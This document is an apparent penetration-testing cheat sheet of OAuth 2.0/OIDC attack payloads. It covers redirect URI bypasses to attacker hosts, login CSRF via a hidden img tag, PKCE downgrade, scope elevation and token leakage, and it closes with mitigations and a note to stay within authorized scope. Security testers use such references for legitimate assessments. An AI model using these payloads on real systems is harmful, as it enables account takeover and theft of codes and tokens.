# OAUTH 2.0 / OIDC ATTACK PAYLOADS

[OAUTH.NET (SPEC REFERENCE)](https://oauth.net/2/) · [OAUTH DEBUGGER](https://oauthdebugger.com/) · [JWT DECODER (FOR ID TOKENS)](https://www.jwt.io/)

Authorization Request

    GET /authorize?response_type=code&client_id=[ID]&redirect_uri=[URI]&scope=openid%20profile&state=[STATE]

Token Exchange

    curl -X POST -d 'grant_type=authorization_code&code=[CODE]&redirect_uri=[URI]&client_id=[ID]&client_secret=[SECRET]' [URL]/token

OAuth 2.0 is an authorization delegation framework, not an authentication protocol — OIDC layers identity (the `id_token`) on top of it. Most OAuth attacks target the redirect/callback handling, weak or missing `state`/PKCE validation, or implicit trust between the client app and the authorization server — not the underlying grant cryptography.

## Structure Reference

| Part | Contains | Relevance |
|---|---|---|
| `client_id` / `redirect_uri` | Identifies the requesting app and where to send the user back | If `redirect_uri` is validated loosely (prefix match, no match at all), this is the primary attack surface for code/token theft |
| `state` | Opaque value round-tripped through the flow | The CSRF defense for the callback — if missing or not validated, the flow itself is forgeable |
| `code` (authorization code flow) | Short-lived, single-use credential exchanged for tokens | Theft here is only useful if it can be exchanged before the legitimate client does, or if `redirect_uri`/PKCE binding is weak |
| `access_token` / `id_token` | Bearer credential / signed identity assertion (often a JWT) | The actual security boundary for API access and identity — `id_token` reuses JWT attack surface (see JWT cheat sheet) |
| `scope` | Requested permission set | Client-controlled in the request — server must enforce what's actually grantable, not just echo what's asked for |

## Redirect URI Manipulation

| Technique | Payload | Purpose |
|---|---|---|
| Open redirect via path traversal | `redirect_uri=https://victim.com/callback/../../attacker.com` | If validation only checks the registered prefix/host loosely, traversal or parser confusion can redirect the code/token elsewhere |
| Subdomain takeover / wildcard abuse | `redirect_uri=https://evil.attacker-controlled-subdomain.victim.com/callback` | If the registered redirect allows a wildcard subdomain and one is unclaimed/takeoverable, codes/tokens can be exfiltrated to it |
| Open redirect chaining | `redirect_uri=https://victim.com/legit-callback?next=https://attacker.com` | If the legitimate, registered callback itself contains an open redirect, the code/token still lands at `victim.com` first but the user (and code, if exposed in the URL/referrer) is forwarded onward |
| Missing exact-match validation | `redirect_uri=https://victim.com.attacker.com/callback` | Tests whether the server does substring/prefix matching instead of exact match against the registered URI |
| `redirect_uri` omitted entirely | Request sent with no `redirect_uri` parameter | Some misconfigured servers fall back to a default or the first registered URI rather than rejecting the request |

## CSRF / `state` Parameter Attacks

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Missing `state` validation | Authorization request crafted without `state`, then attacker's own valid `code` is delivered to the victim's callback URL | Forces the victim's browser to complete the attacker's OAuth flow, linking the victim's session to the attacker's third-party account (login CSRF) |
| `state` reuse / predictability | Observe `state` values across sessions for patterns (sequential, timestamp-based) | A predictable `state` is functionally equivalent to no CSRF protection at all |
| `state` not bound to session | Send a `state` value that was never issued to the current session | Tests whether the server validates `state` server-side against the originating session, vs. just checking it round-trips unchanged |

## Authorization Code Interception / Misuse

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Code injection via crafted callback | Attacker triggers victim's browser to visit `https://victim.com/callback?code=[ATTACKER_OWN_CODE]&state=[VALID_STATE]` | If the client app doesn't bind the code to the session that initiated the flow, the victim's account gets linked to the attacker's identity |
| Authorization code replay | Re-submit an already-used `code` to `/token` | Tests whether the server actually enforces single-use; replay should fail but is worth confirming |
| Missing PKCE on public clients | Authorization code flow run without `code_challenge`/`code_verifier` on a mobile/SPA client | Public clients can't keep a `client_secret` confidential — without PKCE, an intercepted code can be exchanged by anyone |
| PKCE downgrade | Request initiated with PKCE, then token exchange attempted without `code_verifier` | Tests whether the server actually rejects the exchange or silently allows it without the verifier |

## Scope / Privilege Attacks

| Technique | Payload | Purpose |
|---|---|---|
| Scope elevation in request | `scope=openid%20profile%20admin` (requesting an unadvertised/internal scope) | Tests whether the authorization server validates requested scopes against what the client is actually registered/allowed to request |
| Scope confusion across clients | Use a `client_id` registered for limited scope but present an `access_token` to an API expecting a broader-scope client | Tests whether the resource server actually validates the token's granted scope rather than just trusting any valid token |
| Refresh token scope upgrade | Use a `refresh_token` issued with one scope to request an `access_token` with `scope=` set wider than originally granted | Tests whether refresh exchanges re-validate scope or just reissue whatever's asked for |

## Implicit / Hybrid Flow & Token Leakage

| Technique | Payload (conceptual) | Purpose |
|---|---|---|
| Token leakage via `Referer` header | Implicit flow returns `access_token` in the URL fragment/query, page then loads third-party resources | Tokens in the URL (rather than fragment-only, browser-retained) can leak via `Referer` headers, browser history, or server access logs |
| `id_token` accepted as proof of authorization | Client app treats receipt of a valid `id_token` as sufficient to grant API access, without validating `aud`/`azp` | `id_token`s are identity assertions for the specific client they were issued to — accepting them for unrelated purposes is a confused-deputy pattern |
| Mix-up attack (multiple authorization servers) | Client configured to trust multiple AS, attacker substitutes a token/code from a malicious-but-trusted AS in place of the legitimate one | If the client doesn't verify which AS actually issued a given response, tokens can be mixed up across trusted issuers |

## EXAMPLE PAYLOADS

**Redirect URI bypass attempt (loose validation):**
```
GET /authorize?response_type=code&client_id=abc123&redirect_uri=https://victim-app.com.attacker.com/callback&scope=openid+profile&state=xyz
```

**Login CSRF via missing/unbound `state` (attacker delivers their own valid code to the victim):**
```html
<img src="https://victim-app.com/callback?code=ATTACKER_CODE&state=ATTACKER_STATE" style="display:none">
```

**PKCE downgrade test (initiate with PKCE, exchange without verifier):**
```
GET /authorize?response_type=code&client_id=abc123&redirect_uri=https://victim-app.com/callback&scope=openid&state=xyz&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256

curl -X POST -d 'grant_type=authorization_code&code=[CODE]&redirect_uri=https://victim-app.com/callback&client_id=abc123' https://victim-app.com/token
# (no code_verifier included)
```

**Scope elevation attempt:**
```
GET /authorize?response_type=code&client_id=abc123&redirect_uri=https://victim-app.com/callback&scope=openid+profile+internal.admin&state=xyz
```

## Tooling Note

Manual probing builds understanding of the underlying flaw, but dedicated tools automate most of these checks against a live target in one pass: Burp Suite's "Autorize" and "OAuth" extensions for flow interception and replay, `oauth2c` for scripted flow testing, and `EsPReSSO` (Burp) for protocol-level OAuth/SAML analysis. Stay within authorized scope — forged callbacks and account-linking CSRF can cause real, persistent account compromise against production identity providers.

## Mitigations (for writeups)

- Validate `redirect_uri` with an exact, full-string match against a pre-registered allowlist — never prefix, substring, or wildcard matching.
- Always issue and validate a unique, unpredictable `state` bound to the user's session; reject callbacks where it doesn't match.
- Require PKCE (`S256`) for all public clients (SPAs, mobile apps), and treat it as mandatory rather than optional even for confidential clients.
- Enforce single-use, short-lived authorization codes bound to the original `client_id` and `redirect_uri`.
- Validate `id_token` `aud` and `azp` claims against the expecting client before trusting it for any purpose; never accept an `id_token` as an API access credential.
- Validate requested `scope` server-side against what the specific client is registered/permitted for — never trust the client to self-limit.
- Prefer the authorization code flow with PKCE over the implicit flow; avoid returning tokens directly in redirect URLs where avoidable.

## Quick Notes

- Most real-world OAuth vulnerabilities come from redirect/callback validation gaps and missing `state`/PKCE binding, not flaws in the grant types themselves.
- Always map the full flow first (authorize → callback → token exchange → resource access) and identify which party validates what at each hop before attempting any technique.
- A successful redirect URI bypass combined with a missing/unbound `state` is usually the highest-impact OAuth finding, since it enables full account takeover via a single crafted link.
